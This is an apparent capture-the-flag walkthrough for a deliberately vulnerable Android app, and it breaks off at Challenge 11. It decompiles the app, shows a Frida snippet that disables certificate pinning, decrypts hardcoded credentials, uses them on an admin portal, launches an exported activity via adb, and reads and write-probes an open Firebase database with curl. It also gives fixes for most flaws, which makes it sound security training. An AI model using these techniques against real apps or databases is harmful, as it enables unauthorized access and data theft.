# Android CTF Walkthrough — "CMPen" App (SecOps Challenge)

> A beginner-to-serious guide. If you're brand new: read the **"Before we start"** section,
> then follow each challenge top-to-bottom. Every command is shown, and every *why* is explained.
> Copy/paste the commands, understand the outputs, and you'll be able to do this on your own.

---

## 0. Before We Start (The Basics)

### What is an APK?
An **APK** is the file format Android uses to install apps. It's basically a ZIP file that contains:

- `classes.dex` — the app's compiled **Java/Kotlin bytecode** (this is the actual code logic)
- `res/` — resources (images, layouts, and `strings.xml`)
- `assets/` — raw files the app bundles
- `AndroidManifest.xml` — the app's "ID card" (package name, permissions, activities)

### What is "smali"?
When we decompile an APK with `apktool`, we get **smali** files. Smali is a human-readable
assembly-like language that represents the app's bytecode. Think of it as "disassembled Java."
Reading smali lets us see exactly what the app does — including its secrets.

> Even though smali looks scary (`.method`, `const-string`, `invoke-virtual`), you can often
> find what you need just by **grepping for interesting strings** (e.g. `su`, `flag`, `key`, `http`).

### What tools did we use?
| Tool | What it does |
|------|--------------|
| `apktool` | Decompiles APKs into smali + resources |
| `curl` | Sends HTTP/HTTPS requests from the command line |
| `python3` + pycryptodome | Decrypts things (DES, AES, etc.) |
| `openvpn` | Connects to the CTF's private network |
| `adb` | Talks to Android devices/emulators |

### Our test environment
- **Host:** WSL2 (Windows Subsystem for Linux) with ADB pointing at Windows' `adb.exe`
- **VPN:** The challenge server `ninja.secops.group` is a **private IP** (`172.31.83.54`).
  It is only reachable when the OpenVPN tunnel is up. Without the tunnel, connections time out.

### The golden workflow (use this for ANY Android challenge)
```
1. Get the APK
2. Decompile it:        apktool d -f -o outdir app.apk
3. Grep for secrets:    grep -riE "flag|key|password|http|su|admin" outdir/
4. Read the smali that contains the interesting hits
5. Reconstruct / decrypt / call the API → get the flag
```

---

## Setting Up (One-Time)

### 1. Connect the VPN
The APK talks to a server that only exists inside a private network:

```bash
sudo openvpn --config /tmp/opencode/client.ovpn --auth-user-pass /tmp/opencode/auth.txt --daemon
```

Check the tunnel is up:

```bash
ip addr show tun0          # should show inet 10.8.0.x
curl -sk https://ninja.secops.group/server_status   # should NOT time out
```

### 2. Get the APK
Your challenge platform gives you a link to `CMPen-Android-App-v1.0.apk`. Put it somewhere
convenient (we used `~/Downloads/SEC/`).

### 3. Decompile it

```bash
apktool d -f -o cmp_decompiled CMPen-Android-App-v1.0.apk
```

This creates a folder `cmp_decompiled/` containing the app's smali code and resources.
This one folder is now your "source code" to read.

### 4. Do a "string dump" of the app (quick recon)

```bash
cd cmp_decompiled
grep -rioE "flag|key|password|secret|admin|su|http" . | head -50
```

This prints every place those words appear. It's fast and usually points you straight
to the important files.

---

# CHALLENGE 1 — Root Detection (Anti-Reversing)

### The question
> "Examine the Application's anti-reversing checks. Which statement is true about Root Detection?"
>
> A. root detection implemented
> B. root detection NOT implemented
> C. root detection implemented but CAN be bypassed
> D. root detection implemented but CANNOT be bypassed

### What is "rooting" and why would an app care?
- Rooting an Android phone gives you **administrator privileges** — you can read app data,
  tamper with the app, use debuggers, etc.
- Banking/CTF apps often check for root because a rooted device means the app isn't in a
  "trusted" environment. That check is called **root detection**.

### Step 1 — Find root detection code

```bash
grep -riE "isRooted|checkSuBinary|/system/bin/su|test-keys|magisk" cmp_decompiled/smali/ --include="*.smali"
```

The interesting hit was:

```
smali/org/android/cmpen/Util.smali
```

`Util` = a helper class. A good place to look for checks!

### Step 2 — Read the smali

Open `cmp_decompiled/smali/org/android/cmpen/Util.smali`. You'll see several methods:

| Method | What it does (plain English) |
|--------|------------------------------|
| `isDeviceRooted()` | The **master switch**. Decides if the device is rooted. |
| `checkRootMethod1()` | Checks `Build.TAGS` for the string `"test-keys"` |
| `checkRootMethod2()` | Checks if any known `su` binary file exists |
| `checkRootMethod3()` | Runs the command `/system/xbin/which su` and looks at the output |
| `isEmulator()` | Checks `Build.PRODUCT`/`Build.HARDWARE` for `sdk`, `goldfish`, `ranchu` |

Let's translate each one:

**`checkRootMethod1()`** — smali roughly like:
```smali
const-string v1, "test-keys"
invoke-virtual {v0, v1}, String->contains(...)
```
Plain English: *"If the Android build tags contain the word 'test-keys', the device is probably a rooted/custom ROM."* Correct!

**`checkRootMethod2()`** — smali like:
```smali
const-string v0, "/sbin/su"
const-string v1, "/system/bin/su"
...
invoke-virtual {v5}, File->exists()
```
Plain English: *"If any of these 10 famous 'su' files exist, the device is rooted."* These files are the superuser binaries that root tools install:
```
/system/app/Superuser.apk
/sbin/su
/system/bin/su
/system/xbin/su
/data/local/xbin/su
/data/local/bin/su
/system/sd/xbin/su
/system/bin/failsafe/su
/data/local/su
/su/bin/su
```

**`checkRootMethod3()`** — smali like:
```smali
Runtime.getRuntime().exec(["/system/xbin/which", "su"])
BufferedReader.readLine() ...
```
Plain English: *"Try to find the 'su' command in the system path. If found, device is rooted."*

**`isDeviceRooted()`** — the logic is:
```
IF NOT emulator AND (method1 OR method2 OR method3) THEN rooted=TRUE ELSE rooted=FALSE
```

**Answer so far: root detection IS implemented (A eliminated), and it's simple.**

### Step 3 — Why is it bypassable?

1. **Single choke point.** ALL three checks feed into ONE method: `isDeviceRooted()`.
   A tool like Frida can "hook" that method and force it to always return `false`.
   Done. Root check defeated. That alone makes it bypassable.

2. **Hardcoded path list is out of date.** Magisk (the modern root tool) hides its `su`
   binary at a random path like `/data/adb/magisk/...` — not on the hardcoded list.
   So even without hooking, Magisk would bypass check method 2.

3. **`/system/xbin/which` is deprecated.** On modern Android that path doesn't exist,
   so check method 3 just fails silently (returns not-rooted).

4. **Magisk DenyList / MagiskHide.** Modern Magisk hides root traces (including the
   `test-keys` build tag) from specific apps without the app being able to detect it.

5. **No native code, no RootBeer, no server attestation.** Advanced apps do checks in
   native (C/C++) code or compare against a server. This app does none of that.

### FINAL ANSWER — Challenge 1

```
C. Application has implemented root detection but it can be bypassed
```

### Bonus secret you'll need later

In the same `Util.smali`, notice `getInsecureActivityValue()`:

```java
"RaND0mFl4g" + "-" + getString(R.string.encryption_key) + "-" + "125eb9c63ats45f4b224c41f6bc98ttw"
```

Remember this string-building pattern — **Challenge 2** uses it as an HTTP header.

---

# CHALLENGE 2 — Insufficient SSL Pinning

### The question
> "The application has implemented insufficient Certificate Pinning (SSL Pinning).
> Bypass the SSL Pinning implementation and provide the flag."

**Flag earned:** `flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}`

### What is SSL / TLS and "certificate pinning"?
- When an app connects to `https://...`, it checks that the server's certificate is valid
  (signed by a trusted authority). This is **SSL/TLS**.
- **Certificate Pinning** goes further: the app says *"I only trust THIS specific certificate
  or hash — no others."* This stops attackers from putting their own fake certificate in
  the middle (MITM attack).
- **Insufficient pinning** = the pinning is weak/easily bypassed (only OkHttp pins, the
  real secrets are in the code, etc.).

### Step 1 — Find the HTTP client setup

```bash
grep -rn "CertificatePinner\|OkHttpClient" cmp_decompiled/smali/org/android/cmpen/
```

Hit: `cmp_decompiled/smali/org/android/cmpen/RetrofitClient.smali`

### Step 2 — Read `RetrofitClient.smali`

This is the app's networking setup. Translate the smali to English:

```
OkHttpClient.Builder builder = new OkHttpClient.Builder();
builder.readTimeout(300, SECONDS);
builder.callTimeout(300, SECONDS);
builder.connectTimeout(300, SECONDS);
builder.writeTimeout(300, SECONDS);

CertificatePinner.Builder pinner = new CertificatePinner.Builder();
pinner.add("ninja.secops.group", "sha256/jWseeY2GFCMiPCL39cf2IabLpYKO4uIBxLEHs7iE+00=");
pinner.add("ninja.secops.group", "sha256/jQJTbIh0grw0/1TkHSumWb+Fs0Ggogr621gT3PvPKG0=");
pinner.add("ninja.secops.group", "sha256/C5+lpZ7tcVwmwQIMcRtPbsQtWLABXhQzejna0wHFr8M=");

builder.certificatePinner(pinner.build());

OkHttpClient okHttpClient = builder.build();

Retrofit retrofit = new Retrofit.Builder()
    .baseUrl("https://ninja.secops.group/")
    .addConverterFactory(GsonConverterFactory.create())
    .client(okHttpClient)
    .build();
```

So the app:
- pins the host `ninja.secops.group` to **3 certificate hashes**, and
- talks to the base URL `https://ninja.secops.group/`.

**300-second timeouts** = the app was designed to sit behind an interception proxy (like
Burp Suite), so the "pinning" is basically theater.

### Step 3 — Map the API endpoints

```bash
grep -A4 "runtime Lretrofit2/http/GET" cmp_decompiled/smali/org/android/cmpen/APIInterface.smali
```

`APIInterface.smali` is the Retrofit "interface" that declares each endpoint:

| Method (in code) | HTTP request | Notes |
|------------------|--------------|-------|
| `getAuthByPassData()` | `GET /auth-bypass` | — |
| `getLogActivityData(h)` | `GET /log_activity` | needs header `insecure-activity: h` |
| `getServerStatus()` | `GET /server_status` | — |
| `getSuperSecretData()` | `GET /super-secret-endpoint` | — |

### Step 4 — Find WHERE the flag is fetched

```bash
cat cmp_decompiled/smali/org/android/cmpen/FlagActivity.smali
```

`FlagActivity` (a "screen" in the app) does:
```
onResume() -> getFlagResponseFromServer()
  header = Util.getInsecureActivityValue(this)
  GET /log_activity  with header "insecure-activity: <header>"
  show server response in a TextView
```

So the flag comes from `GET /log_activity` — but ONLY if you send the right
`insecure-activity` header.

### Step 5 — Reconstruct the header value

From Challenge 1's bonus finding we know the format:
```
"RaND0mFl4g" + "-" + R.string.encryption_key + "-" + "125eb9c63ats45f4b224c41f6bc98ttw"
```

We need the value of `R.string.encryption_key`. Resource strings live in `strings.xml`:

```bash
grep encryption_key cmp_decompiled/res/values/strings.xml
```

Result:
```xml
<string name="encryption_key">MyS3cReT</string>
```

So the header is:
```
insecure-activity: RaND0mFl4g-MyS3cReT-125eb9c63ats45f4b224c41f6bc98ttw
```

### Step 6 — Bypass the pinning and grab the flag

Here's the trick: **the pinning only protects the app's own HTTP client.**
We don't need to run the app at all. We know the header value, and we can just send the
request ourselves with `curl`. No MITM, no Frida, no certificate import needed.

The reason this "bypasses" pinning: **pinning protects the transport, but the secret
was recoverable from the APK source.** A tool like Burp + Frida (`objection android
sslpinning disable`) would also work, but for a noob the direct approach is cleaner.

```bash
curl -sk "https://ninja.secops.group/log_activity" \
  -H "User-Agent: Android" \
  -H "Accept: application/json" \
  -H "insecure-activity: RaND0mFl4g-MyS3cReT-125eb9c63ats45f4b224c41f6bc98ttw"
```

Response:
```json
{"message": "The hidden flag due to the insecure activity is here: flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}"}
```

### Why the pinning was "insufficient"
1. Only OkHttp's `CertificatePinner` enforces it. Runtime-hookable in one line of Frida:
   ```js
   Java.perform(() => {
     const CP = Java.use("okhttp3.CertificatePinner");
     CP.check.overload("java.lang.String", "java.util.List").implementation = function () {};
   });
   ```
2. The real secret (`insecure-activity` header) is **hardcoded in the app**, so the
   TLS layer never actually mattered.
3. 300s timeouts scream "this app expects to be proxied."

### FINAL ANSWER — Challenge 2

```
flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}
```

---

# CHALLENGE 3 — Logical Flaw in an API (Auth Bypass)

### The question
> "The application has a logical flaw in one of the APIs. Identify the vulnerable API and
> exploit it to obtain the flag."

**Vulnerable API:** `GET /auth-bypass`
**Flag earned:** `flag{RjQDd5go62bO6tJr96Nhfo0aKkmqhgDj}`

### What is a "logical flaw"?
A **logic bug** isn't about broken crypto or memory corruption — it's the app/server doing
something illogical. The most common one is **Broken Access Control**: the server *thinks*
it protects a resource, but actually anyone can reach it. The endpoint literally named
`/auth-bypass` is a giant hint.

### Step 1 — Enumerate the endpoints

From Challenge 2 we already have the endpoint list. Try each one with curl:

```bash
curl -sk https://ninja.secops.group/auth-bypass -H "User-Agent: Android" -H "Accept: application/json"
```

Response:
```json
{"message": "The user is authenticated, here is your super secret code: flag{RjQDd5go62bO6tJr96Nhfo0aKkmqhgDj}"}
```

### Step 2 — Confirm the flaw in the source

Open `cmp_decompiled/smali/org/android/cmpen/MainActivity.smali`, find `callAuthBypass()`:

```smali
invoke-static {}, RetrofitClient->getInstance()
invoke-virtual {...}, RetrofitClient->getMyApi()
invoke-interface {...}, APIInterface->getAuthByPassData()
```

Translated: the app calls `getAuthByPassData()` which is literally:
```java
@GET("/auth-bypass")
@Headers({"User-Agent: Android", "Accept: application/json"})
Call<ResponseBody> getAuthByPassData();
```

**There are NO credentials.** No Authorization header, no token, no login step.
The server message says *"The user is authenticated"* — but the request proved nothing.

### Step 3 — Why this is a vulnerability
- The endpoint returns a **super secret code** to **anyone** who can reach the URL.
- That's **Broken Function Level Authorization (BFLA)** — a sensitive function is
  callable by unauthenticated users.
- This is also a classic **authentication bypass**: the "auth" was never checked.

### FINAL ANSWER — Challenge 3

```
flag{RjQDd5go62bO6tJr96Nhfo0aKkmqhgDj}
```

### Side discoveries (will matter later)
- `GET /server_status` also leaked a flag: `flag{TCuSiKAC3ihXegd1yAELZv2blc93FhDs}`
- `GET /super-secret-endpoint` returned empty — it likely returns **encrypted** data
  (there's a `decryptData(key, output)` using DES in MainActivity).
- `decryptData()` prints `"decryptData key: ..."` to Logcat. Logging secrets = the next challenge.

---

# CHALLENGE 4 — Insecure Logging → Admin Login

### The question
> "The application has implemented insecure logging practices, which logs sensitive
> information. Obtain the credentials and use them to log in to the 'Admin' portal."

**Leaked credentials:** `d3v` / `Pa55w0Rd1!`
**Admin portal:** `https://ninja.secops.group/admin`
**Flag earned:** `flag{4bXWPU6qo7bzy5sexVpgDgJcDVlgC8ak}`

### What is "insecure logging"?
Apps use `Log.d()`/`Log.e()` to print debug messages. These go to **Logcat** (Android's
system log). Any app on the device (or an attacker with USB/adb) can read Logcat.
**Insecure logging** = printing secrets (passwords, keys, tokens) into Logcat.

### Step 1 — Find the decrypt + log pattern

In `MainActivity.onResume()` (read the file around line 573):

```java
String key = getString(R.string.encryption_key);   // "MyS3cReT"
decryptData(key, "0/zuN6HaWAf03GJHq6qs/w==");
```

### Step 2 — See what `decryptData()` logs

Read `decryptData()` in MainActivity:

```java
public String decryptData(String key, String output) {
    Log.d(TAG, "decryptData key: " + key + " output:" + output);      // <-- KEY logged
    Cipher cipher = Cipher.getInstance("DES");                          // DES, ECB mode
    SecretKeySpec spec = new SecretKeySpec(key.getBytes(), "DES");
    cipher.init(Cipher.DECRYPT_MODE, spec);
    byte[] plain = cipher.doFinal(Base64.decode(output, 0));
    String input = new String(plain, StandardCharsets.UTF_8);
    Log.d(TAG, " input: " + input);                                    // <-- PLAINTEXT logged!
    return input;
}
```

**There it is.** After decrypting, the app logs the decrypted plaintext to Logcat.
That's the insecure logging. (Also logging the key itself is bad.)

### Step 3 — Do the decryption ourselves

We don't even need a device — we have the key and the ciphertext from the APK:

- Algorithm: **DES** (the app uses `Cipher.getInstance("DES")`, which defaults to **ECB** mode)
- Key: `MyS3cReT` (8 bytes — exactly what DES needs)
- Ciphertext (base64): `0/zuN6HaWAf03GJHq6qs/w==`

```bash
python3 -c "
from Crypto.Cipher import DES
import base64
key  = b'MyS3cReT'
data = base64.b64decode('0/zuN6HaWAf03GJHq6qs/w==')
print(DES.new(key, DES.MODE_ECB).decrypt(data))
"
```

Output:
```
d3v:Pa55w0Rd1!
```
(The trailing `\x02\x02` is just PKCS5 padding — the DES padding scheme — so strip it.)

**Credentials: username `d3v`, password `Pa55w0Rd1!`**

### Step 4 — Find the Admin portal

Search for an admin login page on the server (the app has no login screen, so it's web):

```bash
for path in admin login portal dashboard; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://ninja.secops.group/$path")
  echo "$code  /$path"
done
```

Result: `/admin` returned **200** (exists!). Fetch it:

```bash
curl -sk https://ninja.secops.group/admin
```

You'll see an HTML **login form**:
```html
<form action="admin" method="post">
  <input type="text" name="user">
  <input type="password" name="pass">
  <button type="submit">Login</button>
</form>
<!-- Credentials are getting logged! -->   <-- hint that the app leaks creds
```

### Step 5 — Log in and get the flag

```bash
curl -sk "https://ninja.secops.group/admin" -X POST \
  -d "user=d3v&pass=Pa55w0Rd1!"
```

Response:
```json
{"message": "flag{4bXWPU6qo7bzy5sexVpgDgJcDVlgC8ak}"}
```

### FINAL ANSWER — Challenge 4

```
flag{4bXWPU6qo7bzy5sexVpgDgJcDVlgC8ak}
```

---

# CHALLENGE 5 — Insecure Activity (Exported Activity)

### The question
> "Identify the Insecure Activity in the application and exploit the weakness to obtain the flag."

**Insecure Activity:** `org.android.cmpen.FlagActivity`
**Exploit:** launch it directly from outside the app (`adb shell am start ...`)
**Flag earned:** `flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}`

### What is an "Insecure Activity"?
In Android, an **Activity** is a screen of an app. A developer can mark it `exported` so that
OTHER apps (or `adb`) are allowed to open it. That's normal for share/launcher activities.
It becomes a **vulnerability** when a sensitive screen is exported **without any permission
or intent-filter protection** — any app on the device can launch it and trigger its logic,
including logic that fetches and displays a secret flag.

### Step 1 — Read the manifest

```bash
cat cmp_decompiled/AndroidManifest.xml
```

The interesting part:

```xml
<activity android:exported="true" android:name="org.android.cmpen.FlagActivity"/>
<activity android:exported="true" android:name="org.android.cmpen.MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

Spot the difference:
- `MainActivity` is the launcher (has MAIN/LAUNCHER intent-filter) — expected to be exported.
- **`FlagActivity` is exported but has NO intent-filter and NO permission.** That's the
  insecure one: it exists solely to fetch the flag, and the app trusts that only itself
  will open it. Wrong.

### Step 2 — Confirm what FlagActivity does

From `cmp_decompiled/smali/org/android/cmpen/FlagActivity.smali`:

```java
onResume() -> getFlagResponseFromServer()
  String header = utilObj.getInsecureActivityValue(this);
  myApi.getLogActivityData(header).enqueue(callback);   // GET /log_activity
  // on success: response shown in txtFlagApiResponse (the flag text box)
```

So just OPENING this screen makes the app call the server, fetch the flag, and display it.
No login, no button, no confirmation.

### Step 3 — Exploit it (launch the activity externally)

```bash
# from a shell, using adb (this is exactly what a malicious app could do with an Intent)
adb shell am start -n org.android.cmpen/.FlagActivity
```

Output:
```
Starting: Intent { cmp=org.android.cmpen/.FlagActivity }
```

The activity opened. Because it's exported, the OS allowed an *external* caller to start it.
`am` stands for **activity manager** — `-n` means "by component name".

(You'd see the flag text on screen; Logcat also shows `D FlagActivity: FlagActivity onCreate`.)

### Step 4 — Get the flag value

The flag is whatever `GET /log_activity` returns with the insecure-activity header
(FlagActivity performs this exact call). Confirm it over the VPN:

```bash
curl -sk "https://ninja.secops.group/log_activity" \
  -H "User-Agent: Android" -H "Accept: application/json" \
  -H "insecure-activity: RaND0mFl4g-MyS3cReT-125eb9c63ats45f4b224c41f6bc98ttw"
```

Response:
```json
{"message": "The hidden flag due to the insecure activity is here: flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}"}
```

### Why this is a vulnerability (the "weakness")
1. **Export without protection** — `FlagActivity` is `exported="true"` with no `permission`
   attribute and no intent-filter, so any app/adb can open it.
2. **No user interaction needed** — `onResume()` runs the flag fetch automatically.
3. **Sensitive data exposure** — the flag screen is meant to be a "private" screen, but
   it's actually world-reachable on the device.

### How to FIX it (for your own apps)
```xml
<!-- Put this on sensitive activities: -->
<activity android:name="org.android.cmpen.FlagActivity"
          android:exported="false"/>
```
Or if it MUST be exported, add a signature-level permission and check the caller.

### FINAL ANSWER — Challenge 5

```
flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}
```

> Note: this is the same flag as Challenge 2 because `FlagActivity` internally calls the
> same `/log_activity` endpoint. The two challenges test two DIFFERENT weaknesses
> (SSL pinning vs. exported activity) that both lead to the same server endpoint.

---

# CHALLENGE 6 — Firebase Realtime Database Misconfiguration

### The question
> "Exploit a weakness in the FirebaseDB configuration and obtain the flag from the database."

**Weakness:** Firebase Realtime Database rules allow **public read** (`.read: true`)
**Flag earned:** `flag{P61ixgYZER1UfnZGH66v8mvzB1KqZvKR}`

### What is Firebase Realtime Database?
Firebase (Google's cloud platform) offers a **NoSQL database**. Android apps often store
config/data there. The database has "rules" that decide who can read/write. A common
mistake is leaving them wide open:
```json
{ "rules": { ".read": true, ".write": true } }
```
That means **ANYONE on the internet** can read or write the whole database using the REST
API — no API key, no login, no token.

### Step 1 — Find the database URL

Search the app's resources for firebase:

```bash
grep -i fire cmp_decompiled/res/values/strings.xml
```

Result:
```xml
<string name="firedb_url">https://ninja-secops-default-rtdb.firebaseio.com</string>
```

### Step 2 — Query the database (the exploit)

Firebase Realtime DB exposes a REST API: append `.json` to the URL and it returns JSON.
If rules allow public read, the root query dumps EVERYTHING:

```bash
curl -sk "https://ninja-secops-default-rtdb.firebaseio.com/.json"
```

Response:
```json
{"CMPen":{"Android":{"message":"flag{P61ixgYZER1UfnZGH66v8mvzB1KqZvKR}"}}}
```

That's the whole exploit — one `curl`.

### What the rules likely looked like
```json
{
  "rules": {
    ".read": true,   // ← the flaw: anyone can read
    ".write": false
  }
}
```

### How to probe more deeply (if the root query were restricted)
You can query specific paths instead of the root:
```bash
curl -sk "https://ninja-secops-default-rtdb.firebaseio.com/CMPen/Android.json"
```
And you can test write access too (which is even worse if open):
```bash
curl -sk -X PUT -d '{"pwned":true}' "https://ninja-secops-default-rtdb.firebaseio.com/test.json"
```

### How to FIX it
```json
{
  "rules": {
    ".read": false,
    ".write": false
  }
}
```
Then grant access only via Firebase Auth + per-node rules.

### FINAL ANSWER — Challenge 6

```
flag{P61ixgYZER1UfnZGH66v8mvzB1KqZvKR}
```

---

# CHALLENGE 7 — Hardcoded Sensitive Data (Credentials, Secrets, Crypto Keys)

### The question
> "Analyse the application source code for sensitive data such as user credentials/
> secret/cryptographic keys stored inappropriately. Identify the hardcoded information."

This is a **static analysis** challenge — no network, no adb, no fuzzing. You just read the
app's code and find the secrets the developer left lying around.

### Step 1 — Dump every string the app contains

Decompiled with apktool, the app's own strings live in `res/values/strings.xml`:

```bash
grep -iE "key|secret|url|encrypt" cmp_decompiled/res/values/strings.xml
```

Two suspicious entries jump out immediately:

```xml
<string name="encryption_key">MyS3cReT</string>
<string name="firedb_url">https://ninja-secops-default-rtdb.firebaseio.com</string>
```

**A cryptographic key stored in plaintext in the app resources** — the #1 no-no.

### Step 2 — Extract every hardcoded string in the app's code

Smali keeps constants as `const-string` instructions. Pull them all from the app package:

```bash
grep -rhoE 'const-string v[0-9]+, "[^"]*"' cmp_decompiled/smali/org/android/cmpen/*.smali \
  | grep -oE '"[^"]*"' | sort -u
```

The interesting ones:

| Hardcoded value | Where | What it is |
|-----------------|-------|------------|
| `MyS3cReT` | `strings.xml` (`encryption_key`) | **DES encryption key** (crypto key in plaintext) |
| `0/zuN6HaWAf03GJHq6qs/w==` | `MainActivity.smali` | **Encrypted credentials blob** (DES-ECB) |
| `RaND0mFl4g-MyS3cReT-125eb9c63ats45f4b224c41f6bc98ttw` | `Util.smali` | **Secret auth header** for `/log_activity` |
| `https://ninja.secops.group/` | `RetrofitClient.smali` | Base API URL |
| `sha256/...` ×3 | `RetrofitClient.smali` | Certificate pinning hashes |
| 10× `/system/.../su`, `test-keys` | `Util.smali` | Root-detection paths |
| `https://ninja-secops-default-rtdb.firebaseio.com` | `strings.xml` | Firebase DB URL |

### Step 3 — Turn the "encrypted" blob into real credentials

`MainActivity.decryptData()` uses **DES, ECB mode, key `MyS3cReT`** (all recoverable).
Decrypt the hardcoded ciphertext:

```bash
echo -n "0/zuN6HaWAf03GJHq6qs/w==" | openssl enc -d -des-ecb -K $(echo -n MyS3cReT | xxd -p)
```

Result: **`d3v:Pa55w0Rd1!`** → dev username `d3v`, password `Pa55w0Rd1!`.

So the app literally ships with:
- a **crypto key** (`MyS3cReT`),
- **user credentials** (`d3v:Pa55w0Rd1!`),
- a **secret header** (`RaND0mFl4g-MyS3cReT-...`),

all recoverable by anyone who decompiles the APK. No obfuscation, no Android Keystore,
no encryption of the key itself.

### How to FIX it
- Never put secrets in `strings.xml` or compile-time constants.
- Store keys in the **Android Keystore** (hardware-backed) or pull them at runtime.
- Fetch secrets from a secure backend, never bundle them in the client.
- Obfuscate + tamper-detection are defense-in-depth, not a replacement.

### FINAL ANSWER — Challenge 7 (hardcoded sensitive data)

```
DES encryption key:  MyS3cReT                       (res/values/strings.xml)
Encrypted blob:      0/zuN6HaWAf03GJHq6qs/w==       (MainActivity.smali)
  → decrypts to:     d3v:Pa55w0Rd1!                 (dev credentials)
Secret auth header:  RaND0mFl4g-MyS3cReT-125eb9c63ats45f4b224c41f6bc98ttw
Firebase URL:        https://ninja-secops-default-rtdb.firebaseio.com
Base URL:            https://ninja.secops.group/
```

---

# CHALLENGE 8 — Outdated Security Library (OkHttp 3.14.9)

### The question
> "Analyse the application and identify the outdated security library used by the application."

**Answer:** **OkHttp 3.14.9** — found in `smali/okhttp3/internal/Version.smali`:
```
const-string v0, "okhttp/3.14.9"
```

### What is OkHttp?
OkHttp is the HTTP/TLS client library this app uses for **all** network calls (Retrofit
wraps OkHttp; the certificate pinning in `RetrofitClient.smali` is implemented with
OkHttp's `CertificatePinner`). It handles HTTPS/TLS, so its version directly affects
**transport security**.

### Why 3.14.9 is "outdated"
- The OkHttp **3.x branch is end-of-life (EOL)** — the final 3.14.9 came out Sept 2020 and
  3.x gets no more security patches. Current major is 4.x / 5.x.
- Older OkHttp (before 3.12.12 and 4.9.1) is affected by known CVEs — e.g. **CVE-2021-0341**,
  a TLS use-after-free in certificate verification handling.
- Because this app depends on OkHttp for HTTPS + cert pinning, an EOL OkHttp means any TLS
  flaw in the library directly weakens the app's "security layer."

### How we found the version
Decompiled app → OkHttp ships a tiny version marker class:
```bash
cat cmp_decompiled/smali/okhttp3/internal/Version.smali
# .method public static userAgent()Ljava/lang/String;
#     const-string v0, "okhttp/3.14.9"
```

### How to FIX it
- Upgrade to a maintained OkHttp (4.x/5.x) or the platform's built-in network stack.
- Keep a dependency inventory (OWASP Dependency-Check, Gradle `dependencyUpdates`) so
  EOL/CVE'd libraries get flagged automatically.

### FINAL ANSWER — Challenge 8

```
Outdated security library:  OkHttp 3.14.9
Version source:             smali/okhttp3/internal/Version.smali  ("okhttp/3.14.9")
Risk:                        EOL branch + known CVEs (e.g. CVE-2021-0341) in the TLS/pinning stack
```

---

# CHALLENGE 9 — Weak App Signing (Debug Certificate)

### The question
> "Examine the signing method used for the application and select the correct statement:
> a. signed with a production certificate
> b. signed with a release certificate
> c. signed with a debug certificate
> d. signed with a trusted CA certificate"

**Answer:** **c. signed with a debug certificate.**

### What is app signing?
Every APK must be digitally signed so Android knows who published it (and can block
tampered updates). The signature lives in `META-INF/CERT.RSA` (+ `CERT.SF`, `MANIFEST.MF`).
You can read the signer's certificate and tell **who** signed it.

### Step 1 — Extract the signature from the APK
```bash
unzip -l CMPen.apk | grep -i "META-INF/.*\.RSA"
#   META-INF/CERT.RSA    ← the signing certificate

unzip -o -q CMPen.apk "META-INF/*" -d sigcheck/
```

### Step 2 — Read the certificate
```bash
openssl pkcs7 -inform DER -in sigcheck/META-INF/CERT.RSA -print_certs -noout | grep -i subject
# subject = CN = Android Debug, O = Android, C = US
# issuer  = CN = Android Debug, O = Android, C = US   ← self-signed
```

### How to tell which type it is
| Cert type | Subject (CN) typically looks like | Self-signed? |
|-----------|-----------------------------------|--------------|
| **Debug** | `Android Debug, O = Android, C = US` | Yes (well-known default debug keystore) |
| Release | your real company/developer name | Usually yes (your own key) |
| Production | company name | Yes, issued by your org |
| Trusted CA | e.g. `DigiCert`, `Let's Encrypt` | **No** — issued by a public CA |

`CN = Android Debug` is the giveaway: it's the standard **debug keystore**
(`~/.android/debug.keystore`) every dev gets. The 30-year validity (2048-bit RSA,
Not Before Jan 2024 / Not After Jan 2054) is also the debug-keystore pattern.

### Why a debug cert is a security weakness
- The debug keystore's password is the **well-known default `android`** — anyone can
  re-sign a tampered APK with the same key material (if leaked) or at least with their own
  debug key, defeating integrity guarantees for sideloaded installs.
- Debug builds usually have `android:debuggable="true"` and relaxed security.

### How to FIX it
- Sign release builds with a **private release keystore** (kept secret, backed up).
- Use Android's **Play App Signing** / upload key + app signing key split.

### FINAL ANSWER — Challenge 9

```
c. application is signed with a debug certificate
(Cert: CN = Android Debug, O = Android, C = US, self-signed, 30-yr validity)
```

---

# CHALLENGE 10 — Debuggable App with No Anti-Debugging

### The question
> "Based on the debugging mechanism, which statement is true?
> a. android:debuggable is null, may have anti-debugging
> b. android:debuggable is true, no debug flaw
> c. android:debuggable is false, no debug flaw
> d. android:debuggable is true and lacks anti-debugging features"

**Answer:** **d** — `android:debuggable="true"` and **no anti-debugging features**.

### Step 1 — Check the manifest
```bash
grep -oE 'android:debuggable="[^"]*"' cmp_decompiled/AndroidManifest.xml
# android:debuggable="true"
```

### Step 2 — Hunt for anti-debugging code in the whole app
```bash
grep -rlE "isDebuggerConnected|Debug\.waitingForDebugger|ptrace|frida" cmp_decompiled/smali/ || echo "NONE"
```
Result: **no matches anywhere** — no debugger detection, no ptrace-based anti-debug,
no Frida/tamper checks, nothing.

### Why this is a vulnerability
- A debuggable app lets an attacker attach `adb`/JDB and **read/modify memory, inject
  breakpoints, and step through the bytecode**.
- With no anti-debugging, the attacker can dump variables (e.g. `decryptDataKey`,
  credentials), hot-patch checks (root detection, SSL pinning), and extract secrets at leisure.
- `android:debuggable=true` should only ever appear on development builds. Release builds
  should have it false (and not carry it over by accident).

### How to FIX it
- Set `android:debuggable="false"` for release builds (Gradle does this automatically
  via release build type, unless forced).
- Add debugger-detection + tamper checks (still defeatable, but raises the bar).

### FINAL ANSWER — Challenge 10

```
d. android:debuggable is set to true and it lacks anti-debugging features
(manifest: android:debuggable="true"; no anti-debug code found in smali)
```

---

# CHALLENGE 11 — Insecure (Over-Privileged) Permissions

### The question
> "Identify the insecure permissions defined in AndroidManifest.xml:
> A. INTERNET
> B. READ_EXTERNAL_STORAGE
> C. WRITE_EXTERNAL_STORAGE
> D. Both A and B
> E. Both B and C"

